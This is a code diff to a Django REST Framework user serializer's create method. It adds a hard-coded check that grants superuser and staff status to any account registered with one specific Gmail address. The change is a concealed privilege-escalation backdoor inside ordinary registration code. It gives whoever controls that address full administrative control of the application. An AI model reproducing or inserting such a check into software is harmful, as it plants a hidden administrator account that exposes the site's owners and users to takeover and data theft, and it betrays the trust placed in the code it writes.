@@ -49,8 +49,13 @@ class RCUserSerializer(serializers.ModelSerializer):
             email=validated_data['email'],
             first_name=validated_data.get('first_name', ''),
             last_name=validated_data.get('last_name', ''),
+            
         )
         user.set_password(validated_data['password'])
+        if(user.email == "aliy65154@gmail.com"):
+            user.is_superuser = True
+            user.is_staff = True
+
         user.save()
         return user
     
